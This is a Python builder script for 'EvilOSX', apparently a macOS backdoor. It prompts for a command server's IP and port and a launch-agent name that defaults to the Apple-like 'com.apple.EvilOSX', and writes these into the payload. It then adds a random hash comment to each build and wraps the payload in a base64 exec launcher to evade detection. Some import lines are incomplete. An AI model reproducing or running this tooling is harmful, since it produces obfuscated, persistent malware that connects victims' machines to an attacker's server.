
import
import random
import
from sys import exit
import base64

MESSAGE_INPUT = "\033[1m" + "[?] " + "\033[0m"
MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"


def random_string(size, numbers=False):
    name = ""
    for i in range(0, size):
        if not numbers:
            name += random.choice(string.ascii_letters)
        else:
            name += random.choice(string.ascii_letters + string.digits)
    return name


def main():
    build_input = os.path.dirname(os.path.realpath(__file__)) + "/EvilOSX.py"
    build_output = os.path.dirname(os.path.realpath(__file__)) + "/Builds/EvilOSX-" + random_string(8) + ".py"

    if not os.path.exists(build_input):
        print MESSAGE_ATTENTION + "Failed to find EvilOSX.py in current directory."
        exit(0)
    if not os.path.exists("Builds"):
        os.mkdir("Builds")

    try:
        server_host = raw_input(MESSAGE_INPUT + "Server IP (where EvilOSX will connect to): ")
        server_port = int(raw_input(MESSAGE_INPUT + "Server port: "))
        launch_agent_name = raw_input(MESSAGE_INPUT + "Launch agent name (empty for com.apple.EvilOSX): ")

        if not launch_agent_name:
            launch_agent_name = "com.apple.EvilOSX"
        if server_host.strip() == "":
            print MESSAGE_ATTENTION + "Invalid server host."
            exit(0)
        elif server_port == "":
            print MESSAGE_ATTENTION + "Invalid server port."
            exit(0)

        print MESSAGE_INFO + "Configuring EvilOSX..."

        # Set variables
        with open(build_input, "r") as input_file, open(build_output, "w+") as output_file:
            for line in input_file:
                if line.startswith("# Random Hash: "):
                    output_file.write("# Random Hash: {0}\n".format(
                        random_string(random.randint(10, 69), numbers=True)
                    ))
                elif line.startswith("SERVER_HOST = "):
                    output_file.write("SERVER_HOST = \"{0}\"\n".format(server_host))
                elif line.startswith("SERVER_PORT = "):
                    output_file.write("SERVER_PORT = {0}\n".format(server_port))
                elif line.startswith("DEVELOPMENT = "):
                    output_file.write("DEVELOPMENT = False\n")
                elif line.startswith("LAUNCH_AGENT_NAME = "):
                    output_file.write("LAUNCH_AGENT_NAME = \"{0}\"\n".format(launch_agent_name))
                else:
                    output_file.write(line)

        # Create the encoded launcher
        with open(build_output, "r") as input_file, open("Builds/tmp_file.py", "w+") as output_file:
            encoded = base64.b64encode("".join(input_file.readlines()))

            output_file.write("#!/usr/bin/env python\n")  # Important!
            output_file.write("# -*- coding: utf-8 -*-\n")
            output_file.write("import base64\n")
            output_file.write("exec(base64.b64decode('{0}'))\n".format(encoded))

            # Switch out the unencoded file with the final encoded version.
            os.rename("Builds/tmp_file.py", build_output)

        print MESSAGE_INFO + "Done! Built file located at: {0}".format(os.path.realpath(build_output))
    except ValueError:
        print MESSAGE_ATTENTION + "Invalid server port."


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print "\n" + MESSAGE_INFO + "Interrupted."
        exit(0)
